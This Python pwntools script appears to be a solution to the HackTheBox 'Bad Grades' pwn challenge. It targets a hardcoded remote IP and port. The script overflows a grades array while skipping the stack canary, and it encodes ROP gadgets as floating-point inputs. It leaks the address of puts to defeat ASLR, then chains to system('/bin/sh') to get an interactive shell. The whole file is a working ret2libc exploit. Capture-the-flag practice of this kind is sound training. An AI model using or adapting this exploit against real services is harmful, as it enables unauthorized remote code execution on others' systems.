import os
from pwn import *
###################setup file and elf files####################
level = "Bad Grades"
ip = "165.22.115.197:30657"
os.chdir("/home/ayush/Work/HackTheBox/Challenges/PWN/"+level)
print(os.getcwd())

context.arch = 'amd64'
elf = ELF("./bad_grades")
libc = ELF("./libc.so.6")

##################function to to get float value from the hex#####################
def hex_to_double(val):
	# we need to make sure it is 8 bytes so use 64bits packer
	# print(val) # debug to see if there is "0x" infront
	# return in double (little endian)
	val = struct.unpack('d', struct.pack('l',val))[0]
	return str(val)

######################start process##########################

# r = process("./bad_grades")
r = remote(ip.split(':')[0], ip.split(':')[1])

#####################process setup for buffer overflow#######################
r.sendlineafter(">", "2")
def setup_overflow(r, count):
	r.sendlineafter("grades:", count)
	for _ in range(35):
	    r.sendline(".")

##################store hex value on stack###############################

def store_hex(val):
	r.sendline(hex_to_double(val))

##############ROP for ASLR libc to get puts address and libc address###################

rop_elf = ROP(elf)
#35 to overflow to reach the return address(array(33) + canary(1) + RBP(1)) + 4 values to insert in the stack
setup_overflow(r, "39")
#to print the got address of the puts function(which will be of libc library)
store_hex((rop_elf.find_gadget(["pop rdi", "ret"]))[0])
store_hex(elf.got['puts'])
store_hex(elf.plt['puts'])
store_hex(0x00400fd5)

r.recvuntil("\n")
leaked_addr_puts_libc = u64(r.recvuntil("\n").strip().ljust(8, b"\x00"))

server_libc_base_addr = leaked_addr_puts_libc - libc.symbols['puts']
log.info("Leaked server's libc address, puts(): " + hex(server_libc_base_addr))

###################using libc to get shell######################

libc.address = server_libc_base_addr

rop_libc = ROP(libc)

#35 to overflow to reach the return address(array(33) + canary(1) + RBP(1)) + 4 values to insert in the stack
setup_overflow(r, "39")
#to align the stack
store_hex((rop_libc.find_gadget(["ret"]))[0])
log.info(rop_libc.dump())
#to run the system syscall with /bin/sh string as argument
store_hex((rop_libc.find_gadget(["pop rdi", "ret"]))[0])
store_hex(next(libc.search(b"/bin/sh\x00")))
store_hex(libc.symbols['system'])


#####################collecting result and shell#######################
r.recvuntil("\n")
r.interactive()